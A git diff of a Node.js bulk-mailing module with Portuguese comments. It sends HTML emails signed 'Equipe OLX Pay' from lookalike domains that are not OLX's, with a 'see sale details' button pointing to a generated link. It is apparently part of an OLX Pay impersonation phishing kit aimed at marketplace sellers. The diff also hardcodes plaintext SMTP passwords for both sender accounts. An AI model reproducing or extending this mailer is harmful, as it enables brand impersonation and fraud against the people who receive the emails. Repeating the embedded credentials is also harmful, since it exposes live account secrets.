@@ -3,24 +3,26 @@ const fs = require("fs");
 const path = require("path");
 const { linkProduto: getLinkProduto } = require("./dominio.js");
 
-// Configuração do transporte SMTP
+// Configuração do transporte SMTP para a Hostinger
 const transporter = nodemailer.createTransport({
-  service: "gmail", // troque para seu serviço: 'gmail', 'hotmail', etc
+  host: "smtp.hostinger.com",
+  port: 465, // Porta segura com SSL/TLS
+  secure: true, // true para 465
   auth: {
-    user: "siteolx@siteolx.com", // seu email
-    pass: "wsko fobj ibpd kppo", // sua senha ou senha de app
+    user: "vendas@noreplyolx.online",
+    pass: "Feemdeus$77",
   },
 });
 
 /**
  * Função para enviar e-mail
- * @param {string} destinatario - e-mail do destinatário
- * @param {string} assunto - assunto do e-mail
- * @param {string} htmlConteudo - conteúdo em HTML do e-mail
+ * @param {string} destinatario e-mail do destinatário
+ * @param {string} assunto assunto do e-mail
+ * @param {string} htmlConteudo conteúdo em HTML do e-mail
  */
 async function enviarEmail(destinatario, assunto, htmlConteudo) {
   const mailOptions = {
-    from: '"Equipe OLX Pay" <siteolx@siteolx.com>', // remetente
+    from: '"Equipe OLX Pay" <vendas@noreplyolx.online>', // Remetente oficial com o seu e-mail da Hostinger
     to: destinatario,
     subject: assunto,
     html: htmlConteudo,
@@ -53,9 +55,9 @@ function carregarDadosVendas() {
 
 /**
  * Função para enviar e-mails em massa para uma lista de destinatários
- * @param {Array} listaEmails - lista de e-mails destinatários
- * @param {string} codigoProduto - (opcional) código específico do produto
- * @param {string} assuntoPersonalizado - (opcional) assunto personalizado do e-mail
+ * @param {Array} listaEmails lista de e-mails destinatários
+ * @param {string} codigoProduto (opcional) código específico do produto
+ * @param {string} assuntoPersonalizado (opcional) assunto personalizado do e-mail
  */
 async function enviarEmMassa(
   listaEmails,
@@ -78,7 +80,6 @@ async function enviarEmMassa(
     : dadosVendas[0];
 
   if (!produto) {
-    // lança exceção para que o chamador possa tratar
     throw new Error(
       `Produto com código ${codigoProduto || "<nenhum>"} não encontrado`,
     );
@@ -135,7 +136,7 @@ async function enviarEmMassa(
   <div style="text-align: center; margin: 30px 0;">
     <a href="${linkProduto}"
        style="background-color: #7c00ff; color: #fff; padding: 12px 24px; text-decoration: none; border-radius: 6px; font-size: 15px;">
-       Ver detalhes da venda
+        Ver detalhes da venda
     </a>
   </div>
 
@@ -176,7 +177,3 @@ module.exports = {
   enviarEmMassa,
   carregarDadosVendas,
 };
-
-// Descomentar para testar
-// teste();
-// testarEnvioEmMassa();
